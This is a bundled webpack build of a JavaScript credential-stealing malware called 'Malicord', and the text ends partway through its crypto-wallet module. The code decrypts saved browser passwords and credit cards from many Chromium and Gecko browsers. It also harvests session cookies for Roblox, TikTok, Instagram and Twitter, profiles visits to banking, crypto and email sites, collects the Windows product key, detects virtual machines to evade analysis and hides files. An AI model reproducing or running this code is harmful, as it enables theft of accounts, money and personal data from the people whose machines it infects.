website.push(row.origin_url);\n      }\n    }\n  }\n  return passwords;\n}\n\nasync function getAutofills(basepath, browser) {\n  var autofills = [];\n\n  if (fs.existsSync(`${basepath}Web Data`)) {\n    let rows = [];\n    try {\n      rows = await tempSqlite(\n        `${basepath}Web Data`,\n        \"SELECT name, value FROM autofill\"\n      );\n    } catch (e) {}\n\n    for (let row of rows) {\n      autofills.push(new Autofill(row.name, row.value, browser));\n    }\n  }\n\n  return autofills;\n}\n\nasync function getDownloads(basepath) {\n  var downloads = [];\n\n  if (fs.existsSync(`${basepath}History`)) {\n    let rows = [];\n    try {\n      rows = await tempSqlite(\n        `${basepath}History`,\n        \"SELECT target_path, tab_url, total_bytes FROM downloads\"\n      );\n    } catch (e) {}\n\n    for (let row of rows) {\n      downloads.push(\n        new Download(row.target_path, row.tab_url, row.total_bytes)\n      );\n    }\n  }\n\n  return downloads;\n}\n\nasync function getCreditCards(basepath) {\n  let creditcards = [];\n  let key = getMasterKey(basepath);\n\n  if (fs.existsSync(`${basepath}Web Data`)) {\n    let rows = [];\n    try {\n      rows = await tempSqlite(\n        `${basepath}Web Data`,\n        \"SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted, billing_address_id, nickname FROM credit_cards\"\n      );\n    } catch (e) {}\n\n    for (let row of rows) {\n      let number = row.card_number_encrypted;\n\n      if (\n        number.toString().startsWith(\"v10\") ||\n        number.toString().startsWith(\"v11\")\n      ) {\n        if (key == \"\") {\n          continue;\n        }\n\n        try {\n          number = decryptChrome(number, key);\n        } catch (e) {\n          continue;\n        }\n      } else {\n        try {\n          number = boukiapi.unprotectData(number, null, \"CurrentUser\");\n        } catch (e) {\n          continue;\n        }\n      }\n\n      creditcards.push(\n        new CreditCard(\n          row.guid,\n          row.name_on_card,\n          row.expiration_month,\n          row.expiration_year,\n          number,\n          row.billing_address_id,\n          row.nickname\n        )\n      );\n    }\n  }\n\n  return creditcards;\n}\n\nasync function getHistory(basepath) {\n  var history = [];\n\n  if (fs.existsSync(`${basepath}History`)) {\n    let rows = [];\n    try {\n      rows = await tempSqlite(\n        `${basepath}History`,\n        \"SELECT url, title, visit_count, last_visit_time FROM urls\"\n      );\n    } catch (e) {}\n\n    for (let row of rows) {\n      history.push(\n        new Visit(row.url, row.title, row.visit_count, row.last_visit_time)\n      );\n    }\n  }\n\n  return history;\n}\n\nasync function getBookmarks(basepath, browser) {\n  let bookmarks = [];\n\n  if (fs.existsSync(`${basepath}Bookmarks`)) {\n    fs.copyFileSync(`${basepath}Bookmarks`, `${basepath}Bookmarks_tmp`);\n    let json = JSON.parse(fs.readFileSync(`${basepath}Bookmarks_tmp`));\n    fs.unlinkSync(`${basepath}Bookmarks_tmp`);\n\n    for (let bookmark of json.roots.bookmark_bar.children) {\n      bookmarks.push(\n        new Bookmark(bookmark.name, bookmark.url, bookmark.date_added, browser)\n      );\n    }\n  }\n\n  return bookmarks;\n}\n\nasync function getGeckoCookies(basepath) {\n  var cookies = [];\n\n  if (fs.existsSync(`${basepath}cookies.sqlite`)) {\n    let rows = [];\n    try {\n      rows = await tempSqlite(\n        `${basepath}cookies.sqlite`,\n        \"SELECT name, value, host, path, expiry, isSecure FROM moz_cookies\"\n      );\n    } catch (e) {}\n\n    for (let row of rows) {\n      if (row.name.includes(\".ROBLOSECURITY\")) {\n        stat.AddRoblox(row.value);\n      }\n      if (row.host.includes(\".tiktok\")) {\n        if (row.name.includes(\"sessionid\")) {\n          stat.addTikTok(row.value);\n        }\n      }\n      if (row.host.includes(\".instagram\")) {\n        if (row.name.includes(\"sessionid\")) {\n          stat.addSessIDInsta(row.value);\n        }\n      }\n      if (row.host.includes(\".twitter\")) {\n        let saved = row;\n        saved.value = row.value;\n        stat.AddTwitter(saved);\n      }\n      cookies.push(\n        new Cookies(\n          row.host,\n          row.path,\n          row.isSecure,\n          row.expiry,\n          row.name,\n          row.value\n        )\n      );\n    }\n  }\n\n  return cookies;\n}\n\nasync function getGeckoPasswords(profile, masterPassword, browser) {\n  const passwords = [];\n  const key = await gecko.getKey(profile, masterPassword);\n  if (key == null) {\n    return passwords;\n  }\n\n  const loginsPath = path.join(profile, \"logins.json\");\n  if (!fs.existsSync(loginsPath)) {\n    return passwords;\n  }\n\n  const loginsData = fs.readFileSync(loginsPath, \"utf8\");\n  const profileLogins = JSON.parse(loginsData);\n  for (const login of profileLogins.logins) {\n    const decodedUsername = gecko.decodeLoginData(login.encryptedUsername);\n    const decodedPassword = gecko.decodeLoginData(login.encryptedPassword);\n    const username = gecko.decrypt(\n      decodedUsername.data,\n      decodedUsername.iv,\n      key,\n      \"3DES-CBC\"\n    );\n    const password = gecko.decrypt(\n      decodedPassword.data,\n      decodedPassword.iv,\n      key,\n      \"3DES-CBC\"\n    );\n\n    let encodeUsername = iconv.encode(username.data, \"latin1\").toString();\n    if (encodeUsername != username.data) {\n      username.data = encodeUsername;\n    }\n\n    let encodePassword = iconv.encode(password.data, \"latin1\").toString();\n    if (encodePassword != password.data) {\n      password.data = encodePassword;\n    }\n    if (username.data !== \"\" && (password.data !== \"\" && password.data !== undefined)) {\n\n    passwords.push(\n      new Password(\n        login.hostname,\n        username.data,\n        password.data,\n        login.timeLastUsed,\n        browser\n      )\n    );\n      }\n  }\n\n  return passwords;\n}\n\nasync function getGeckoBookmarks(basepath, browser) {\n  let bookmarks = [];\n\n  if (fs.existsSync(`${basepath}places.sqlite`)) {\n    let rows = [];\n    try {\n      rows = await tempSqlite(\n        `${basepath}places.sqlite`,\n        \"SELECT id, url, dateAdded, title FROM (SELECT * FROM moz_bookmarks INNER JOIN moz_places ON moz_bookmarks.fk=moz_places.id)\"\n      );\n    } catch (e) {}\n\n    for (let row of rows) {\n      bookmarks.push(new Bookmark(row.title, row.url, row.dateAdded, browser));\n    }\n  }\n\n  return bookmarks;\n}\n\nasync function getGeckoHistory(basepath) {\n  let history = [];\n\n  if (fs.existsSync(`${basepath}places.sqlite`)) {\n    let rows = [];\n    try {\n      rows = await tempSqlite(\n        `${basepath}places.sqlite`,\n        \"SELECT title, url, visit_count, last_visit_date FROM moz_places where title not null\"\n      );\n    } catch (e) {}\n\n    for (let row of rows) {\n      history.push(\n        new Visit(row.url, row.title, row.visit_count, row.last_visit_date)\n      );\n    }\n  }\n\n  return history;\n}\n\nasync function getGeckoDownloads(basepath) {\n  let downloads = [];\n\n  if (fs.existsSync(`${basepath}places.sqlite`)) {\n    let rows = [];\n    try {\n      rows = await tempSqlite(\n        `${basepath}places.sqlite`,\n        \"SELECT GROUP_CONCAT(content), url, dateAdded FROM (SELECT * FROM moz_annos INNER JOIN moz_places ON moz_annos.place_id=moz_places.id) t GROUP BY place_id\"\n      );\n    } catch (e) {}\n\n    for (let row of rows) {\n      try {\n        downloads.push(\n          new Download(\n            row[\"GROUP_CONCAT(content)\"].split(\"},\")[1],\n            row.url,\n            JSON.parse(\n              row[\"GROUP_CONCAT(content)\"].split(\"},\")[0] + \"}\"\n            ).fileSize\n          )\n        );\n      } catch (e) {\n        continue;\n      }\n    }\n  }\n\n  return downloads;\n}\n\nasync function MalicordBrowsers(cc) {\n  if (cc != \"yes\") return;\n  let appdata = process.env.APPDATA;\n  let localappdata = process.env.LOCALAPPDATA;\n\n  var chromiumPath = [\n    {\n      path: appdata + \"\\\\Mail.Ru\\\\Atom\\\\User Data\\\\\",\n      name: \"Atom\",\n    },\n    {\n      path: appdata + \"\\\\Uran\\\\User Data\\\\\",\n      name: \"Uran\",\n    },\n    {\n      path: appdata + \"\\\\Maxthon3\\\\User Data\\\\\",\n      name: \"Maxthon3\",\n    },\n    {\n      path: appdata + \"\\\\liebao\\\\User Data\\\\\",\n      name: \"liebao\",\n    },\n\n    {\n      path: appdata + \"\\\\Coowon\\\\Coowon\\\\User Data\\\\\",\n      name: \"Coowon\",\n    },\n    {\n      path:\n        appdata + \"\\\\Fenrir Inc\\\\Sleipnir5\\\\setting\\\\modules\\\\ChromiumViewer\\\\\",\n      name: \"Sleipnir5\",\n    },\n    {\n      path: appdata + \"\\\\MapleStudio\\\\ChromePlus\\\\User Data\\\\\",\n      name: \"ChromePlus\",\n    },\n    {\n      path: appdata + \"\\\\Superbird\\\\User Data\\\\\",\n      name: \"Superbird\",\n    },\n    {\n      path: appdata + \"\\\\Rafotech\\\\Mustang\\\\User Data\\\\\",\n      name: \"Rafotech\",\n    },\n    {\n      path: appdata + \"\\\\Safer Technologies\\\\Secure Browser\\\\User Data\\\\\",\n      name: \"SaferTechnologies\",\n    },\n    {\n      path: appdata + \"\\\\Suhba\\\\User Data\\\\\",\n      name: \"Suhba\",\n    },\n    {\n      path: appdata + \"\\\\TorBro\\\\Profile\\\\\",\n      name: \"TorBrowser\",\n    },\n    {\n      path: appdata + \"\\\\Elements Browser\\\\User Data\\\\\",\n      name: \"ElementsBrowser\",\n    },\n    {\n      path: appdata + \"\\\\CocCoc\\\\Browser\\\\User Data\\\\\",\n      name: \"CocCoc\",\n    },\n    {\n      path: appdata + \"\\\\Go!\\\\User Data\\\\\",\n      name: \"GoBrowser\",\n    },\n    {\n      path: appdata + \"\\\\QIP Surf\\\\User Data\\\\\",\n      name: \"QIP Surf\",\n    },\n    {\n      path: appdata + \"\\\\RockMelt\\\\User Data\\\\\",\n      name: \"RockMelt\",\n    },\n    {\n      path: appdata + \"\\\\Nichrome\\\\User Data\\\\\",\n      name: \"Nichrome\",\n    },\n    {\n      path: appdata + \"\\\\Bromium\\\\User Data\\\\\",\n      name: \"Bromium\",\n    },\n    {\n      path: appdata + \"\\\\Comodo\\\\Dragon\\\\User Data\\\\\",\n      name: \"Comodo\",\n    },\n    {\n      path: appdata + \"\\\\Xpom\\\\User Data\\\\\",\n      name: \"Xpom\",\n    },\n    {\n      path: appdata + \"\\\\Chedot\\\\User Data\\\\\",\n      name: \"Chedot\",\n    },\n    {\n      path: appdata + \"\\\\360Browser\\\\Browser\\\\User Data\\\\\",\n      name: \"360Browser\",\n    },\n    {\n      path: appdata + \"\\\\Opera Software\\\\Opera Stable\\\\\",\n      name: \"Opera\",\n    },\n    {\n      path: appdata + \"\\\\Opera Software\\\\Opera GX Stable\\\\\",\n      name: \"OperaGX\",\n    },\n    {\n      path: localappdata + \"\\\\Epic Privacy Browser\\\\User Data\\\\\",\n      name: \"EpicPrivacy\",\n    },\n    {\n      path: localappdata + \"\\\\Google\\\\Chrome SxS\\\\User Data\\\\\",\n      name: \"ChromeSxS\",\n    },\n    {\n      path: localappdata + \"\\\\Sputnik\\\\Sputnik\\\\User Data\\\\\",\n      name: \"Sputnik\",\n    },\n    {\n      path: localappdata + \"\\\\7Star\\\\7Star\\\\User Data\\\\\",\n      name: \"7Star\",\n    },\n    {\n      path: localappdata + \"\\\\CentBrowser\\\\User Data\\\\\",\n      name: \"CentBrowser\",\n    },\n    {\n      path: localappdata + \"\\\\Orbitum\\\\User Data\\\\\",\n      name: \"Orbitum\",\n    },\n    {\n      path: localappdata + \"\\\\Kometa\\\\User Data\\\\\",\n      name: \"Kometa\",\n    },\n    {\n      path: localappdata + \"\\\\Torch\\\\User Data\\\\\",\n      name: \"Torch\",\n    },\n    {\n      path: localappdata + \"\\\\Amigo\\\\User Data\\\\\",\n      name: \"Amigo\",\n    },\n  ];\n  chromiumPath = chromiumPath.concat(\n    getProfiles(\n      localappdata + \"\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\\",\n      \"Brave\"\n    )\n  );\n  chromiumPath = chromiumPath.concat(\n    getProfiles(localappdata + \"\\\\Xpom\\\\User Data\\\\\", \"Xpom\")\n  );\n  chromiumPath = chromiumPath.concat(\n    getProfiles(\n      localappdata + \"\\\\360Browser\\\\Browser\\\\User Data\\\\\",\n      \"360Browser\"\n    )\n  );\n\n  chromiumPath = chromiumPath.concat(\n    getProfiles(localappdata + \"\\\\Chedot\\\\User Data\\\\\", \"Chedot\")\n  );\n  chromiumPath = chromiumPath.concat(\n    getProfiles(\n      localappdata + \"\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\\",\n      \"Brave\"\n    )\n  );\n  chromiumPath = chromiumPath.concat(\n    getProfiles(localappdata + \"\\\\Iridium\\\\User Data\\\\\", \"Iridium\")\n  );\n  chromiumPath = chromiumPath.concat(\n    getProfiles(localappdata + \"\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\\", \"Yandex\")\n  );\n  chromiumPath = chromiumPath.concat(\n    getProfiles(localappdata + \"\\\\uCozMedia\\\\Uran\\\\User Data\\\\\", \"Uran\")\n  );\n  chromiumPath = chromiumPath.concat(\n    getProfiles(localappdata + \"\\\\Microsoft\\\\Edge\\\\User Data\\\\\", \"Edge\")\n  );\n  chromiumPath = chromiumPath.concat(\n    getProfiles(localappdata + \"\\\\Google\\\\Chrome\\\\User Data\\\\\", \"Chrome\")\n  );\n  chromiumPath = chromiumPath.concat(\n    getProfiles(localappdata + \"\\\\Vivaldi\\\\User Data\\\\\", \"Vivaldi\")\n  );\n\n  var cookieslength = 0;\n  var passwords = [];\n  var autofills = [];\n  var cards = [];\n  var bookmarks = [];\n  var history = [];\n  var downloads = [];\n  let i = 0;\n\n  for (let obj of chromiumPath) {\n    const path = obj.path;\n    if (!fs.existsSync(path)) {\n      continue;\n    }\n\n    i++;\n\n    try {\n      const cookies = await getCookies(path);\n      cookieslength += cookies.length;\n\n      let browserName;\n      if (typeof obj.profile != \"undefined\") {\n        browserName = obj.name + \" [ \" + obj.profile + \" ]\";\n      } else {\n        browserName = obj.name;\n      }\n\n      save.saveCookies(cookies, browserName);\n      passwords = passwords.concat(await getPasswords(path, browserName));\n      autofills = autofills.concat(await getAutofills(path, browserName));\n      cards = cards.concat(await getCreditCards(path));\n      history = history.concat(await getHistory(path));\n      downloads = downloads.concat(await getDownloads(path));\n      bookmarks = bookmarks.concat(await getBookmarks(path, browserName));\n    } catch (e) {\n      continue;\n    }\n  }\n\n  let geckoPath = [];\n  geckoPath = geckoPath.concat(\n    getGeckoProfiles(\n      appdata + \"\\\\K-Meleon\\\\Profiles\\\\\",\n      \"Kmelon\"\n    )\n  );\n  geckoPath = geckoPath.concat(\n    getGeckoProfiles(\n      appdata + \"\\\\Moonchild Productions\\\\Pale Moon\\\\Profiles\\\\\",\n      \"PaleMoon\"\n    )\n  );\n  geckoPath = geckoPath.concat(\n    getGeckoProfiles(appdata + \"\\\\Comodo\\\\IceDragon\\\\Profiles\\\\\", \"IceDragon\")\n  );\n  geckoPath = geckoPath.concat(\n    getGeckoProfiles(\n      appdata + \"\\\\NETGATE Technologies\\\\BlackHaw\\\\Profiles\\\\\",\n      \"BlackHaw\"\n    )\n  );\n  geckoPath = geckoPath.concat(\n    getGeckoProfiles(\n      appdata + \"\\\\8pecxstudios\\\\Cyberfox\\\\Profiles\\\\\",\n      \"Cyberfox\"\n    )\n  );\n  geckoPath = geckoPath.concat(\n    getGeckoProfiles(appdata + \"\\\\Thunderbird\\\\Profiles\\\\\", \"Thunderbird\")\n  );\n  geckoPath = geckoPath.concat(\n    getGeckoProfiles(appdata + \"\\\\Mozilla\\\\SeaMonkey\\\\Profiles\\\\\", \"SeaMonkey\")\n  );\n  geckoPath = geckoPath.concat(\n    getGeckoProfiles(appdata + \"\\\\Mozilla\\\\Firefox\\\\Profiles\\\\\", \"Firefox\")\n  );\n  geckoPath = geckoPath.concat(\n    getGeckoProfiles(appdata + \"\\\\Waterfox\\\\Profiles\\\\\", \"Waterfox\")\n  );\n\n  for (let obj of geckoPath) {\n    const path = obj.path;\n    if (!fs.existsSync(path)) {\n      continue;\n    }\n    i++;\n    try {\n      const cookies = await getGeckoCookies(path);\n      cookieslength += cookies.length;\n      save.saveCookies(cookies, obj.name);\n\n      bookmarks = bookmarks.concat(await getGeckoBookmarks(path, obj.name));\n      history = history.concat(await getGeckoHistory(path));\n      downloads = downloads.concat(await getGeckoDownloads(path));\n\n      passwords = passwords.concat(await getGeckoPasswords(path, \"\", obj.name));\n    } catch (e) {\n      save.SaveError(e + \"\\nError browsers 1\");\n      continue;\n    }\n  }\n  const importantSites = [\n    \"gmail\",\n    \"youtube\",\n    \"onoff\",\n    \"xss.is\",\n    \"pronote\",\n    \"ovhcloud\",\n    \"nulled\",\n    \"cracked\",\n    \"tiktok\",\n    \"yahoo\",\n    \"gmx\",\n    \"aol\",\n    \"coinbase\",\n    \"binance\",\n    \"steam\",\n    \"epicgames\",\n    \"discord\",\n    \"paypal\",\n    \"instagram\",\n    \"spotify\",\n    \"onlyfans\",\n    \"pornhub\",\n    \"origin\",\n    \"amazon\",\n    \"twitter\",\n    \"aliexpress\",\n    \"netflix\",\n    \"roblox\",\n    \"twitch\",\n    \"facebook\",\n    \"riotgames\",\n    \"card\",\n    \"telegram\",\n    \"protonmail\",\n  ];\n\n  function countImportantSites(website, importantSites) {\n    let count = {};\n    importantSites.forEach((importantSite) => {\n      count[importantSite] = 0;\n    });\n    website.forEach((visitedSite) => {\n      importantSites.forEach((importantSite) => {\n        if (visitedSite.includes(importantSite)) {\n          count[importantSite]++;\n        }\n      });\n    });\n    return count;\n  }\n\n  const count = countImportantSites(website, importantSites);\n\n  for (const site in count) {\n    if (count[site] > 0) {\n      stat.AddKeyword(` ${site} : ${count[site]}`);\n    }\n  }\n  save.saveBrowser(passwords, autofills, cards, history, downloads, bookmarks);\n  stat.AddBrowser(\n    passwords.length,\n    cookieslength,\n    autofills.length,\n    cards.length,\n    history.length,\n    downloads.length,\n    bookmarks.length\n  );\n\n  var pass = [];\n  for (let i = 0; i < passwords.length; i++) {\n    pass.push(passwords[i].password);\n  }\n  return pass;\n}\n\nmodule.exports = {\n  MalicordBrowsers,\n  getGeckoPasswords,\n  getGeckoProfiles,\n};\n\n\n//# sourceURL=webpack://script/./utils/browsers.js?");

/***/ }),

/***/ "./utils/core.js":
/*!***********************!*\
  !*** ./utils/core.js ***!
  \***********************/
/***/ ((module, __unused_webpack_exports, __webpack_require__) => {

eval("const fs = __webpack_require__(/*! fs */ \"fs\"),\n  axios = __webpack_require__(/*! axios */ \"axios\"),\n  util = __webpack_require__(/*! util */ \"util\"),\n  exec = util.promisify((__webpack_require__(/*! child_process */ \"child_process\").exec)),\n  execSync = util.promisify((__webpack_require__(/*! child_process */ \"child_process\").execSync)),\n  path = __webpack_require__(/*! path */ \"path\"),\n  { stat } = __webpack_require__(/*! ./stats */ \"./utils/stats.js\");\n\n\n\n\nfunction cleaner() {\n  try {\n    fs.rmSync(stat.testpath[0], { recursive: true });\n  } catch (e) { }\n  try {\n    fs.rmSync(stat.savepath[0], { recursive: true });\n  } catch (e) { }\n}\n\nasync function getProcessPathByPid(pid) {\n  return new Promise((resolve, reject) => {\n    const command =\n      process.platform === \"win32\"\n        ? `wmic process where processid=${pid} get ExecutablePath`\n        : `ps -p ${pid} -o comm=`;\n    execSync(command, (err, stdout, stderr) => {\n      if (err) {\n        reject(err);\n        return;\n      }\n      const path = stdout.trim();\n      resolve(path);\n    });\n  });\n}\n\nfunction isProcessRunning(processName, minCount) {\n  return new Promise((resolve, reject) => {\n    const command = process.platform === 'win32' ? 'tasklist' : 'ps aux';\n    exec(command, (err, stdout, stderr) => {\n      if (err) {\n        reject(err);\n        return;\n      }\n\n      const processes = stdout.toLowerCase();\n      const processNameLower = processName.toLowerCase();\n      const processCount = (processes.match(new RegExp(processNameLower, 'g')) || []).length;\n      resolve(processCount >= minCount);\n    });\n  });\n}\n\n\nfunction filterProcessesByName(name) {\n  return new Promise((resolve, reject) => {\n    const command = process.platform === \"win32\" ? \"tasklist\" : \"ps aux\";\n    exec(command, (err, stdout, stderr) => {\n      if (err) {\n        reject(err);\n        return;\n      }\n      const lines = stdout.split(\"\\n\");\n      const filteredProcesses = [];\n      for (const line of lines) {\n        if (line.toLowerCase().includes(name.toLowerCase())) {\n          const columns = line.split(/\\s+/);\n          filteredProcesses.push({\n            name: columns[0],\n            pid: parseInt(columns[1]),\n            sessionName: columns[2],\n            sessionNumber: parseInt(columns[3]),\n            memoryUsage: parseInt(columns[4].replace(\",\", \"\")),\n          });\n        }\n      }\n      resolve(filteredProcesses);\n    });\n  });\n}\n\nasync function getProcessPathByPid(pid) {\n  return new Promise((resolve, reject) => {\n    const command =\n      process.platform === \"win32\"\n        ? `wmic process where processid=${pid} get ExecutablePath`\n        : `ps -p ${pid} -o comm=`;\n    exec(command, (err, stdout, stderr) => {\n      if (err) {\n        reject(err);\n        return;\n      }\n      const path = stdout.trim();\n      resolve(path);\n    });\n  });\n}\n\n\nfunction generateId(len) {\n  var text = \"\";\n  var possible =\n    \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\";\n  for (var i = 0; i < len; i++)\n    text += possible.charAt(Math.floor(Math.random() * possible.length));\n  return text;\n}\n\nfunction fileName(str) {\n  return str.split(\"\\\\\").pop().split(\"/\").pop();\n}\n\nfunction recursiveRead(basepath, path) {\n  var result = [];\n  if (!basepath.endsWith(\"\\\\\")) {\n    basepath += \"\\\\\";\n  }\n  const files = fs.readdirSync(basepath);\n  for (var i = 0; i < files.length; i++) {\n    const file = files[i];\n    const filePath = basepath + file;\n    if (fs.statSync(filePath).isDirectory()) {\n      result = result.concat(recursiveRead(filePath, path + file + \"\\\\\"));\n    } else {\n      result.push(path + file);\n    }\n  }\n  return result;\n}\n\nasync function checkInternetAccess() {\n  try {\n    await axios.get('http://www.google.com');\n    return true;\n  } catch (error) {\n    try {\n      await axios.get('https://www.facebook.com');\n      return true;\n    } catch (error) {\n      return false;\n    }\n  }\n}\n\n\nfunction getProfiles(path, name) {\n  const profile = path.split(\"%PROFILE%\");\n  if (profile.length == 1) {\n    return [\n      {\n        path: path,\n        name: name,\n      },\n    ];\n  }\n  if (!fs.existsSync(profile[0])) {\n    return [];\n  }\n  var dirs = fs.readdirSync(profile[0]);\n  var profiles = [];\n  for (var i = 0; i < dirs.length; i++) {\n    var dir = dirs[i];\n    if (fs.existsSync(profile[0] + dir + profile[1])) {\n      profiles.push({\n        path: profile[0] + dir + profile[1],\n        profile: name + \" \" + dir,\n      });\n    }\n  }\n\n  return profiles;\n}\n\nasync function GetTotalPhysicalMemory() {\n  let totalPhysicalMemory = \"\";\n  try {\n    totalPhysicalMemory = await getCommand(\n      \"wmic computersystem get totalphysicalmemory | more +1\"\n    );\n  } catch (err) {\n    if (err) {\n      totalPhysicalMemory = 4;\n    }\n  }\n  return parseInt(\n    Math.floor(parseInt(totalPhysicalMemory) / (1024 * 1024 * 1024))\n  );\n}\n\nasync function getDisk() {\n  let size = (await getCommand(\"wmic logicaldisk get size\")).split(\" \");\n  for (let item of size) {\n    if (item.trim() !== \"\" && item.trim().toLowerCase() !== \"size\") {\n      return Math.floor(parseInt(item) / (1024 * 1024 * 1024)).toString();\n    }\n  }\n  return \"1000\";\n}\n\nasync function GetcleanUID() {\n  let uid = await getCommand(\"wmic csproduct get uuid\");\n  let regex_uid = /UUID\\s+([A-Fa-f0-9-]+)/;\n  let match = uid.match(regex_uid);\n  let uuid = match[1];\n  return uuid;\n}\n\nasync function getCommand(cmd) {\n  const { stdout, _ } = await exec(cmd);\n  return stdout.trim();\n}\n\nasync function GetCPUCount() {\n  try {\n    const { stdout } = await getCommand(\"echo %NUMBER_OF_PROCESSORS%\");\n    const cpucount = parseInt(stdout);\n\n    if (!isNaN(cpucount)) {\n      return cpucount.toString();\n    }\n  } catch (error) {\n    return \"4\";\n  }\n}\n\nasync function getInfo() {\n  try {\n    const [disk, ram, uid, cpucount, OS, cpu, GPU, windowskey, windowsversion] =\n      await Promise.all([\n        getDisk(),\n        GetTotalPhysicalMemory(),\n        GetcleanUID(),\n        GetCPUCount(),\n        await getCommand(\"wmic OS get caption, osarchitecture | more +1\"),\n        await getCommand(\"wmic cpu get name | more +1\"),\n        await getCommand(\"wmic PATH Win32_VideoController get name | more +1\"),\n        await getCommand(\n          \"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault\"\n        ),\n        await getCommand(\n          \"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion' -Name ProductName\"\n        ),\n      ]);\n    return {\n      disk,\n      ram,\n      uid,\n      cpucount,\n      OS,\n      cpu,\n      GPU,\n      windowskey,\n      windowsversion,\n    };\n  } catch (e) {\n    if (e) {\n      return {\n        disk: \"None\",\n        ram: \"None\",\n        uid: \"None\",\n        cpucount: \"None\",\n        OS: \"None\",\n        cpu: \"None\",\n        GPU: \"None\",\n        windowskey: \"None\",\n        windowsversion: \"None\",\n      };\n    }\n  }\n}\n\nasync function getPublicIp() {\n  var data = \"\";\n  try {\n    const res = await axios({\n      url: \"https://ipinfo.io/json\",\n      method: \"GET\",\n    });\n    data = res.data;\n    if (data.length > 16) {\n      return \"Failed!\";\n    }\n    return data;\n  } catch (err) {\n    return \"Failed!\";\n  }\n}\n\nasync function isVm() {\n  const { stdout, _ } = await exec(\n    'powershell -c \"Get-WmiObject -Query \\\\\"Select * from Win32_CacheMemory\\\\\"\"'\n  );\n  if (stdout.replace(/\\r/gm, \"\").replace(/\\n/gm, \"\").replace(/ /gm, \"\") == \"\") {\n    return true;\n  }\n  return false;\n}\n\nfunction getHeader() {\n  return `$$\\\\   $$\\\\                                     $$$$$$\\\\                       $$\\\\     $$\\\\                     $$\\\\ \n$$$\\\\  $$ |                                   $$  __$$\\\\                      $$ |    \\\\__|                    $$ |\n$$$$\\\\ $$ | $$$$$$\\\\ $$\\\\    $$\\\\ $$$$$$\\\\        $$ /  \\\\__| $$$$$$\\\\  $$$$$$$\\\\ $$$$$$\\\\   $$\\\\ $$$$$$$\\\\   $$$$$$\\\\  $$ |\n$$ $$\\\\$$ |$$  __$$\\\\\\\\$$\\\\  $$  |\\\\____$$\\\\       \\\\$$$$$$\\\\  $$  __$$\\\\ $$  __$$\\\\\\\\_$$  _|  $$ |$$  __$$\\\\ $$  __$$\\\\ $$ |\n$$ \\\\$$$$ |$$ /  $$ |\\\\$$\\\\$$  / $$$$$$$ |       \\\\____$$\\\\ $$$$$$$$ |$$ |  $$ | $$ |    $$ |$$ |  $$ |$$$$$$$$ |$$ |\n$$ |\\\\$$$ |$$ |  $$ | \\\\$$$  / $$  __$$ |      $$\\\\   $$ |$$   ____|$$ |  $$ | $$ |$$\\\\ $$ |$$ |  $$ |$$   ____|$$ |\n$$ | \\\\$$ |\\\\$$$$$$  |  \\\\$  /  \\\\$$$$$$$ |      \\\\$$$$$$  |\\\\$$$$$$$\\\\ $$ |  $$ | \\\\$$$$  |$$ |$$ |  $$ |\\\\$$$$$$$\\\\ $$ |\n\\\\__|  \\\\__| \\\\______/    \\\\_/    \\\\_______|       \\\\______/  \\\\_______|\\\\__|  \\\\__|  \\\\____/ \\\\__|\\\\__|  \\\\__| \\\\_______|\\\\__|\n                                                                                                                  \n                                                                                                                \n      ###, ,##, ,##,\n       #  # #  # #  #\n       ###  #  # #  #\n       #  # #  # #  #\n       ###' '##' '##'\n            .--,\n           /  (\n          /    \\\\\n         /      \\\\ \n        /  0  0  \\\\\n((()   |    ()    |   ()))\n\\\\  ()  (  .____.  )  ()  /\n |\\` \\\\_/ \\\\  \\`\"\"\\`  / \\\\_/ \\`|\n |       \\`.'--'.\\`       |\n  \\\\        \\`\"\"\\`        /\n   \\\\                  /\n    \\`.              .'    ,\n     |\\`             |  _.'|\n     |              \\`-'  /\n     \\\\                 .'\n      \\`.____________.-'\n\\t\\tMalicord By KSCH | https://t.me/Sordeal\\n\\n\\n\\n\n`\n}\n\nfunction hideFile(filePath) {\n  try {\n    execSync(`powershell -Command \"attrib +h +s \\\\\"${filePath}\\\\\"\"`);\n  } catch (e) { }\n}\n\nmodule.exports = {\n  generateId,\n  fileName,\n  recursiveRead,\n  getProfiles,\n  getPublicIp,\n  isVm,\n  getHeader,\n  getInfo,\n  hideFile,\n  filterProcessesByName,\n  cleaner,\n  getProcessPathByPid,\n  checkInternetAccess,\n  isProcessRunning,\n};\n\n\n//# sourceURL=webpack://script/./utils/core.js?");

/***/ }),

/***/ "./utils/crypto.js":
/*!*************************!*\
  !*** ./utils/crypto.js ***!
  \*************************/
/***/ ((module, __unused_webpack_exports, __webpack_require__) => {

eval("const fs = __webpack_require__(/*! fs */ \"fs\"),\n seco = __webpack_require__(/*! seco-file */ \"seco-file\"),\n core = __webpack_require__(/*! ./core */ \"./utils/core.js\"),\n save = __webpack_require__(/*! ./save */ \"./utils/save.js\"),\n passworder = __webpack_require__(/*! node-passworder */ \"node-passworder\"),\n { stat } = __webpack_require__(/*! ./stats */ \"./utils/stats.js\"),\n { upload } = __webpack_require__(/*! ./uploadFiles */ \"./utils/uploadFiles.js\");\n\nclass Extension {\n  constructor(name, id) {\n    this.name = name;\n    this.id = id;\n  }\n\n  addPath(path) {\n    this.path = path;\n  }\n\n  addProfile(profile) {\n    this.profile = profile;\n  }\n}\n\nclass Cold {\n  constructor(name, existpath, stealpath) {\n    this.name = name;\n    this.existpath = existpath;\n    this.stealpath = stealpath;\n  }\n}\n\nfunction getBrowsersProfile() {\n  const local = process.env.localappdata;\n  const appdata = process.env.appdata;\n\n  const browsers_path = [\n    local +\n      \"\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\%PROFILE%\\\\Local Extension Settings\",\n    local + \"\\\\Google\\\\Chrome\\\\User Data\\\\%PROFILE%\\\\Local Extension Settings\",\n    appdata + \"\\\\Opera Software\\\\Opera GX Stable\\\\Local Extension Settings\",\n    appdata +\n      \"\\\\Opera Software\\\\Opera Stable\\\\User Data\\\\%PROFILE%\\\\Local Extension Settings\",\n    local +\n      \"\\\\Google\\\\Chrome Beta\\\\User 